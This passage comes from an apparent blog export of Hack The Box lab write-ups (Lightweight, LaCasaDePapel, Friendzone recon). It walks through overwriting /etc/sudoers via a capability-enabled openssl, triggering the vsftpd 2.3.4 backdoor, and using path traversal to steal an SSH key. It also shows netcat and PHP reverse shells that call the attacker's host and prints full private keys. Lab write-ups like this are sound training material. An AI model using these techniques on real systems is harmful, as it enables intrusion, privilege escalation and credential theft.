and the password is delete . At this point I was able to extract the files and I found ldapuser1 credentials inside the status.php file: $username = 'ldapuser1'; $password = 'f3ca9d298a553da117442deeb6fa932d'; I switch user with su and I see these files in the ldapuser1 home: [ldapuser1@lightweight home]$ cd ldapuser1 [ldapuser1@lightweight ~]$ ll total 1484 -rw-rw-r--. 1 ldapuser1 ldapuser1 9714 Jun 15 2018 capture.pcap -rw-rw-r--. 1 ldapuser1 ldapuser1 646 Jun 15 2018 ldapTLS.php -rwxr-xr-x. 1 ldapuser1 ldapuser1 555296 Jun 13 2018 openssl -rwxr-xr-x. 1 ldapuser1 ldapuser1 942304 Jun 13 2018 tcpdump I found nothing interesting in the pcap and the PHP files. openssl and tcpdump are binaries and it's unusual to find them in a Home directory. If I check the hash of these binary I notice is exactly the same as the original ones: [ldapuser1@lightweight ~]$ md5sum /usr/bin/openssl fba9d597671181560afeec189d92348c /usr/bin/openssl [ldapuser1@lightweight ~]$ md5sum openssl fba9d597671181560afeec189d92348c openssl [ldapuser1@lightweight ~]$ md5sum /usr/sbin/tcpdump d9e3583b74ec93b4c9c792be985d1b8b /usr/sbin/tcpdump [ldapuser1@lightweight ~]$ md5sum tcpdump d9e3583b74ec93b4c9c792be985d1b8b tcpdump I run LinEnum again and I found two new entries in the capabilities section: [+] Files with POSIX capabilities set: <SNIP> /home/ldapuser1/tcpdump = cap_net_admin,cap_net_raw+ep /home/ldapuser1/openssl =ep openssl shows =ep which basically means it has all the capabilities enabled. Found this out from this article . This is going to be very useful because we can do things that only root can do using openssl . Manipulate the sudoers file save a copy of the /etc/sudoers to /tmp/sudoers.backup add the string \"ldapuser1 ALL=(ALL) ALL\" to the copy copy the content of /tmp/sudoers.backup to /etc/sudoers [ldapuser1@lightweight ~]$ ./openssl base64 -in /etc/sudoers | base64 -d > /tmp/sudoers.backup [ldapuser1@lightweight ~]$ echo \"ldapuser1 ALL=(ALL) ALL\" >> /tmp/sudoers.backup [ldapuser1@lightweight ~]$ cat /tmp/sudoers.backup | base64 | ./openssl enc -d -base64 -out /etc/sudoers [ldapuser1@lightweight ~]$ sudo su - [sudo] password for ldapuser1: Last login: Thu Dec 6 14:09:41 GMT 2018 on tty1 Last failed login: Tue Jun 23 15:20:38 BST 2020 on pts/1 There was 1 failed login attempt since the last successful login. [root@lightweight ~]# cat root.txt f1****************************fa Similarly we could have modified the /etc/passwd and /etc/shadow files.","tags":"blogging","loc":"https://sittingducks.io/Lightweight.html","title":"Lightweight"},{"url":"https://sittingducks.io/LaCasaDePapel.html","text":"Recon m4rc0ff@SittingDucks:~$ nmap -sV -sC 10 .10.10.131 Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-11 12:14 BST Nmap scan report for 10.10.10.131 Host is up (0.23s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.3.4 22/tcp open ssh OpenSSH 7.9 (protocol 2.0) | ssh-hostkey: | 2048 03:e1:c2:c9:79:1c:a6:6b:51:34:8d:7a:c3:c7:c8:50 (RSA) | 256 41:e4:95:a3:39:0b:25:f9:da:de:be:6a:dc:59:48:6d (ECDSA) |_ 256 30:0b:c6:66:2b:8f:5e:4f:26:28:75:0e:f5:b1:71:e4 (ED25519) 80/tcp open http Node.js (Express middleware) |_http-title: La Casa De Papel 443/tcp open ssl/http Node.js Express framework | ssl-cert: Subject: commonName=lacasadepapel.htb/organizationName=La Casa De Papel | Not valid before: 2019-01-27T08:35:30 |_Not valid after: 2029-01-24T08:35:30 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 | tls-nextprotoneg: | http/1.1 |_ http/1.0 Service Info: OS: Unix Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 181.74 seconds The default web page shows this: Nothing really interesting on it, as we as on its html code. Port 443 is open as well and there is a common name mentioned, that is lacasadepapel.htb . So I add this to my /etc/hosts file and I browse to that web page: This time I am asked about client certificate to continue view the web page. I started gobuster on both pages. The http page is extremely slow and seems not to produce any results while the https page gives an error, I guess related to the certificate. I put this on the background and go ahead with some more enumeration. vsftpd 2.3.4 There is a vsftd v 2.3.4 running on the target box. m4rc0ff@SittingDucks:~$ searchsploit vsftpd 2 .3.4 ---------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------- --------------------------------- vsftpd 2.3.4 - Backdoor Command Execution (Metasplo | unix/remote/17491.rb ---------------------------------------------------- --------------------------------- searchsploit shows only one exploit related to a backdoored version of the program. The explot involves using metasploit which I want to avoid using for learning purposes. Doing a little more research I found more information on this blog post by Chris Evans, the author of vsftpd . Apparently in 2011 the site where he was hosting the program was compromised and the attacker/s managed to upload a backdoored version. The backdoor version (code available here ) would allow an attacker to spawn a psy shell (an interactive shell for PHP similar to a python interactive shell) on port 6200 if the USER that attemps to login contains a smiley face in the name, :) . The password can be anything. If we simply try to connect to the server on port 6200, this is what we get: m4rc0ff@SittingDucks:~$ nc 10 .10.10.131 6200 (UNKNOWN) [10.10.10.131] 6200 (?) : Connection refused Now, let's trigger the backdoor with the smiley face: m4rc0ff@SittingDucks:~$ nc 10 .10.10.131 21 220 (vsFTPd 2.3.4) USER m4rc0ff:) 331 Please specify the password. PASS SittingDucks As you can see from the above snippet I have used the user m4rc0ff:) which contains a smiley face at the end and the password SittingDucks . If the server is affected by the vulnerability, what we did above should have triggered the backdoor. Let's verify m4rc0ff@SittingDucks:~$ nc 10 .10.10.131 6200 Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman get_current_user() => \"root\" As shown above I am able to connect to the server on port 6200 and get a Psy Shell. When running the psy command get_current_user() we get \"root\" as a result which is a very good sign. Now we need to find a way to get our flags or better, as I always prefer, to get a proper shell. To get a bash shell I do type the following in the psy shell: `$sock=fsockopen(\"10.10.14.29\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\");` PHP Warning: shell_exec() has been disabled for security reasons in phar://eval()'d code on line 1 To my disappointment it seems that all the functions I can think of such as shell_exec() , as well as exec() and and system() , have been disabled meaning that we won't be able use these to get a reverse shell. We can also see a list of disabled functions from running the phpinfo() command in the shell: <SNIP> disable_functions => exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source => exec,passthru,shell_exec,system,proc_open,popen, curl_exec,curl_multi_exec,parse_ini_file,show_source <SNIP> We can, however, use some other PHP functions such as scandir() to list what's inside a directory and file_get_contents() to read files: m4rc0ff@SittingDucks:~$ nc 10 .10.10.131 6200 Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman scandir('.') => [ \".\", \"..\", \".DS_Store\", \"._.DS_Store\", \"bin\", \"boot\", \"dev\", \"etc\", \"home\", \"lib\", \"lost+found\", \"media\", \"mnt\", \"opt\", \"proc\", \"root\", \"run\", \"sbin\", \"srv\", \"swap\", \"sys\", \"tmp\", \"usr\", \"var\", ] scandir('/home') => [ \".\", \"..\", \"berlin\", \"dali\", \"nairobi\", \"oslo\", \"professor\", ] scandir('/home/berlin') => [ \".\", \"..\", \".ash_history\", \".ssh\", \"downloads\", \"node_modules\", \"server.js\", \"user.txt\", ] We can see there are different names under the /home directory indicating potential users. The /home/berlin directory shows the user.txt file but if we try to read it we get a permission error: file_get_contents('/home/berlin/user.txt') PHP Warning: file_get_contents(/home/berlin/user.txt): failed to open stream: Permission denied in phar://eval()'d code on line 1 We need to find another way to read the flag and get a bash shell! ls Variables: $tokyo The ls command does not list what's on a directory but instead it lists variables, methods, etc. More information can be found with the help command: help help Show a list of commands. Type `help [foo]` for information about [foo]. Aliases: ? ls List local, instance or class variables, methods and constants. Aliases: list, dir dump Dump an object or primitive. doc Read the documentation for an object, class, constant, method or property. Aliases: rtfm, man show Show the code for an object, class, constant, method or property. wtf Show the backtrace of the most recent exception. Aliases: last-exception, wtf? whereami Show where you are in the code. throw-up Throw an exception or error out of the Psy Shell. timeit Profiles with a timer. trace Show the current call stack. buffer Show (or clear) the contents of the code input buffer. Aliases: buf clear Clear the Psy Shell screen. edit Open an external editor. Afterwards, get produced code in input buffer. sudo Evaluate PHP code, bypassing visibility restrictions. history Show the Psy Shell history. Aliases: hist exit End the current session and return to caller. Aliases: quit, q Let's see what's inside $tokyo : show $tokyo > 2| class Tokyo { 3| private function sign($caCert,$userCsr) { 4| $caKey = file_get_contents('/home/nairobi/ca.key'); 5| $userCert = openssl_csr_sign($userCsr, $caCert, $caKey, 365, ['digest_alg'=>'sha256']); 6| openssl_x509_export($userCert, $userCertOut); 7| return $userCertOut; 8| } 9| } We have a class Tokyo that in turn contains a function sign which uses a CA certificate key, /home/nairobi/ca.key , to sign user certificate requests ( $userCsr ) for 365 days using openssl . I think if we managed to sign our own certificate with this CA then we may use it to access the webpage we saw earlier. first off, let's grab the CA private key. To read a file we can use the PHP function file_get_contents() file_get_contents('/home/nairobi/ca.key') => \"\"\" -----BEGIN PRIVATE KEY-----\\n MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb\\n 7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/\\n 2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl\\n uXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M\\n YQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp\\n s2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us\\n PCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V\\n Dj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89\\n 1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ\\n /CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+\\n q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr\\n uaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd\\n I0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og\\n 7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE\\n G3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn\\n sqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH\\n CTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y\\n sm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI\\n ikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2\\n zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/\\n ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC\\n 9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M\\n WGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM\\n 7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR\\n aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc\\n 53udBEzjt3WPqYGkkDknVhjD\\n -----END PRIVATE KEY-----\\n \"\"\" Now I will place this on a text file on my kali box, removing the \\n at the end of each line. Then I can use openssl to create a client certificate we can later import into Firefox to allow access to the website we saw earlier. When we request a client certificate using openssl we will be asked interactively some information. We can grab some of the info of the server checking the certificate details from the browser: m4rc0ff@SittingDucks:~/Documents/htbBoxes/lacasadepapel$ openssl req -x509 -new -nodes -key ca.key -sha256 -days 1024 -out SittingDucks.pem You are about to be asked to enter information that will be incorporated into your certificate request. What you are about to enter is what is called a Distinguished Name or a DN. There are quite a few fields but you can leave some blank For some fields there will be a default value, If you enter '.', the field will be left blank. ----- Country Name (2 letter code) [AU]: State or Province Name (full name) [Some-State]: Locality Name (eg, city) []: Organization Name (eg, company) [Internet Widgits Pty Ltd]:La Casa De Papel Organizational Unit Name (eg, section) []: Common Name (e.g. server FQDN or YOUR name) []:lacasadepapel.htb Email Address []: Now, that I have created the certificate ( SittingDucks.pem ) I will convert it to p12 format so that i will be able to import it to Firefox. m4rc0ff@SittingDucks:~/Documents/htbBoxes/lacasadepapel$ openssl pkcs12 -export -in SittingDucks.pem -inkey ca.key -out SittingDucks.p12 Enter Export Password: Verifying - Enter Export Password: Then from Firefox preferences I go to \"Certificate Manager\" panel and select \"Your Certificates\" section. From there I click import After this I was still presented with the old page telling me I needed a client certificate to access this page. I started clearing the cache and also remove the certificate exception I had previously allowed from the padlock in the browser. Once I did that I was prompted with this: This is the client certificate I had just created. Once I click on Ok, I land to this page: and if I visit one of the season links I get a list of .avi files: Here is where the fun begins :) if I right click and open 01.avi on a new tab I am directed to this URL: https://lacasadepapel.htb/file/U0VBU09OLTEvMDEuYXZp the last part of the URL seems to be base64 encoded. If I decode it I see this: m4rc0ff@SittingDucks:~$ echo U0VBU09OLTEvMDEuYXZp | base64 -d SEASON-1/01.avi More important if I try to go up and visit the parent directory (with .. ) I get this: This means the application is vulnerable to path traversal . What we see seems exactly the content of /home/berlin directory. Since we saw the objects of the URLs are base64 encoded I will encode ../user.txt to see if we will be able to grab the flag: m4rc0ff@SittingDucks:~$ echo \"../user.txt\" | base64 Li4vdXNlci50eHQ Then I will navigate to that page with curl m4rc0ff@SittingDucks:~$ curl -k https://lacasadepapel.htb/file/Li4vdXNlci50eHQ 4d****************************2d Great, we have the user flag! Moving another directory up, that is ../../ , I can see this all the other user directories as expected: Using the same process used to grab the user.txt file, I will grab the SSH private key, id_rsa , from the berlin directory: m4rc0ff@SittingDucks:~$ echo \"../.ssh/id_rsa\" | base64 Li4vLnNzaC9pZF9yc2EK m4rc0ff@SittingDucks:~$ curl -k https://lacasadepapel.htb/file/Li4vLnNzaC9pZF9yc2EK curl: (52) Empty reply from server m4rc0ff@SittingDucks:~$ curl -k https://lacasadepapel.htb/file/Li4vLnNzaC9pZF9yc2EK curl: (7) Failed to connect to lacasadepapel.htb port 443: Connection refused Ops! For some reasons not only that didn't work but it also crashed the application listening on port 443. I had to do a box reset to bring it back but in one occasion I also had to switch the box off and then on again as the reset didn't work. This was super annoying! The issue was that in the example above I didn't use the -n option of the echo command which does not output the trailing new line. Funny enough this did not happen for the user.txt hence I was struggling a bit, but got it in the end: m4rc0ff@SittingDucks:~$ echo -n \"../.ssh/id_rsa\" | base64 Li4vLnNzaC9pZF9yc2E= m4rc0ff@SittingDucks:~$ curl -k https://lacasadepapel.htb/file/Li4vLnNzaC9pZF9yc2E = -----BEGIN OPENSSH PRIVATE KEY----- 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 -----END OPENSSH PRIVATE KEY----- I save this key on my kali box and I try to SSH to the box with the user berlin : m4rc0ff@SittingDucks:~/Documents/htbBoxes/lacasadepapel$ ssh -i private.key berlin@10.10.10.131 The authenticity of host '10.10.10.131 (10.10.10.131)' can't be established. ECDSA key fingerprint is SHA256:rA99W+GVzo0hlABp1vMj9ChhjLwybPhHTpb65AWm7xI. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '10.10.10.131' (ECDSA) to the list of known hosts. berlin@10.10.10.131's password: Permission denied, please try again. After being stuck here for a while, the solution was to try another user. I know, in normal situations it's unlikely to find a user's SSH private key under some other user's directory but this is CTF and these kind of things happen. As shown below I was finally able to login with the user professor : m4rc0ff@SittingDucks:~/Documents/htbBoxes/lacasadepapel$ ssh -i private.key professor@10.10.10.131 _ ____ ____ ____ _ | | __ _ / ___|__ _ ___ __ _ | _ \\ ___ | _ \\ __ _ _ __ ___| | | | / _` | | | / _` / __|/ _` | | | | |/ _ \\ | |_) / _` | '_ \\ / _ \\ | | |__| (_| | | |__| (_| \\__ \\ (_| | | |_| | __/ | __/ (_| | |_) | __/ | |_____\\__,_| \\____\\__,_|___/\\__,_| |____/ \\___| |_| \\__,_| .__/ \\___|_| |_| lacasadepapel [~]$whoami professor Once in, we can see two files in professor home directory: lacasadepapel [~]$ ls -l total 12 -rw-r--r-- 1 root root 88 Jan 29 2019 memcached.ini -rw-r----- 1 root nobody 434 Jan 29 2019 memcached.js drwxr-sr-x 9 root professo 4096 Jan 29 2019 node_modules lacasadepapel [~]$ cat memcached.ini [program:memcached] command = sudo -u nobody /usr/bin/node /home/professor/memcached.js We are only able to read memcached.ini which seems to just load memcached.js as nobody. I have then started a python SimpleHTTPServer in my kali box and hosted LinEnum and pspy . I have then used wget to donwload both files into the /tmp directory of the victim box. While I didn't see anything suspicious with LinEnum I saw something with pspy : <SNIP> 2020/06/22 09:39:00 CMD: UID=0 PID=8599 | /bin/sh /lib/rc/sh/openrc-run.sh /etc/init.d/supervisord start 2020/06/22 09:39:02 CMD: UID=0 PID=8624 | sudo -u nobody /usr/bin/node /home/professor/memcached.js <SNIP> <SNIP> 2020/06/22 09:42:01 CMD: UID=0 PID=8800 | /bin/sh /lib/rc/sh/openrc-run.sh /etc/init.d/supervisord start 2020/06/22 09:42:02 CMD: UID=0 PID=8806 | sudo -u nobody /usr/bin/node /home/professor/memcached.js <SNIP> So it looks like the memcached.js file runs as nobody every 2 minutes straight after the daemon supervisord runs. The command is exactly the same as what we saw inside memcached.ini . After a while I noticed that it didn't happen every 2 minutes. Sometimes I waited for the same thing to happen again but I didn't see it in the pspy output which was weird. However, if I started to watch the process with ps I notice that the PID changes every ~1 minute: lacasadepapel [/tmp]$ watch -n 10 \"ps auxww | grep memcached.js\"|grep -iv grep 9557 nobody 0:19 /usr/bin/node /home/professor/memcached.js 9557 nobody 0:29 /usr/bin/node /home/professor/memcached.js 9557 nobody 0:39 /usr/bin/node /home/professor/memcached.js 9557 nobody 0:49 /usr/bin/node /home/professor/memcached.js 9652 nobody 0:00 /usr/bin/node /home/professor/memcached.js 9652 nobody 0:10 /usr/bin/node /home/professor/memcached.js 9652 nobody 0:21 /usr/bin/node /home/professor/memcached.js 9652 nobody 0:30 /usr/bin/node /home/professor/memcached.js 9652 nobody 0:40 /usr/bin/node /home/professor/memcached.js 9652 nobody 0:50 /usr/bin/node /home/professor/memcached.js 9731 nobody 0:01 /usr/bin/node /home/professor/memcached.js 9731 nobody 0:11 /usr/bin/node /home/professor/memcached.js 9731 nobody 0:21 /usr/bin/node /home/professor/memcached.js 9731 nobody 0:31 /usr/bin/node /home/professor/memcached.js 9731 nobody 0:41 /usr/bin/node /home/professor/memcached.js 9731 nobody 0:51 /usr/bin/node /home/professor/memcached.js 9810 nobody 0:03 /usr/bin/node /home/professor/memcached.js 9810 nobody 0:13 /usr/bin/node /home/professor/memcached.js 9810 nobody 0:23 /usr/bin/node /home/professor/memcached.js 9810 nobody 0:34 /usr/bin/node /home/professor/memcached.js 9810 nobody 0:44 /usr/bin/node /home/professor/memcached.js 9810 nobody 0:54 /usr/bin/node /home/professor/memcached.js 9888 nobody 0:04 /usr/bin/node /home/professor/memcached.js After some research I found that supervisord is a process management tool which allows to schedule process restart among other things. supervisord starts processes as its subprocesses so perhaps this is why the weird behavior observed with pspy . So at this stage I was pretty sure memcached.ini was being pushed by supervisord at regular intervals. Below it's shown that if I create a file (test) inside the professor home that file will be owned by professor: lacasadepapel [~]$ ls -l total 12 -rw-r--r-- 1 root root 88 Jan 29 2019 memcached.ini -rw-r----- 1 root nobody 434 Jan 29 2019 memcached.js drwxr-sr-x 9 root professo 4096 Jan 29 2019 node_modules lacasadepapel [~]$ touch test lacasadepapel [~]$ ls -l total 12 -rw-r--r-- 1 root root 88 Jan 29 2019 memcached.ini -rw-r----- 1 root nobody 434 Jan 29 2019 memcached.js drwxr-sr-x 9 root professo 4096 Jan 29 2019 node_modules -rw-r--r-- 1 professo professo 0 Jun 22 10:12 test We are unable to modify the memcached.ini of course because it is owned by root but we can delete it and recreate it. We can modify the content of the file so that when it runs again it will give us a shell as root . So I create a new file which looks like this: lacasadepapel [~]$ cat memcached.ini [program:memcached] command = sudo /usr/bin/nc 10.10.14.13 443 -e /bin/bash after few moments I get my shell back on the netcat listener I had setup on port 443. I then upgraded to an interacting shell and got the root flag as shown below: m4rc0ff@SittingDucks:~$ sudo rlwrap nc -lvnp 443 listening on [any] 443 ... connect to [10.10.14.13] from (UNKNOWN) [10.10.10.131] 45919 python -c 'import pty;pty.spawn(\"/bin/bash\")' bash-4.4# whoami whoami root bash-4.4# cat /root/root.txt cat /root/root.txt 58****************************11","tags":"blogging","loc":"https://sittingducks.io/LaCasaDePapel.html","title":"LaCasaDePapel"},{"url":"https://sittingducks.io/Friendzone.html","text":"Recon masscan m4rc0ff@SittingDucks:~/Documents/htbBoxes$ sudo masscan -p1-65535 10 .10.10.123 -e tun0 --rate = 1000 [sudo] password for m4rc0ff: Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-06-09 04:35:43 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [65535 ports/host] Discovered open port 80/tcp on 10.10.10.123 Discovered open port 445/tcp on 10.10.10.123 Discovered open port 139/tcp on 10.10.10.123 Discovered open port 443/tcp on 10.10.10.123 Discovered open port 53/tcp on 10.10.10.123 Discovered open port 22/tcp on 10.10.10.123 Discovered open port 21/tcp on 10.10.10.123 nmap (detailed scan on ports found by masscan) m4rc0ff@SittingDucks:~/Documents/htbBoxes$ nmap -sV -sC -p80,445,139,443,53,22,21 10 .10.10.123 Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-09 05:43 BST Nmap scan report for 10.10.10.123 Host is up (0.096s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA) | 256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA) |_ 256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519) 53/tcp open domain ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.11.3-1ubuntu1.2-Ubuntu 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Friend Zone Escape software 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 443/tcp open ssl/http Apache httpd 2.4.29 |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: 404 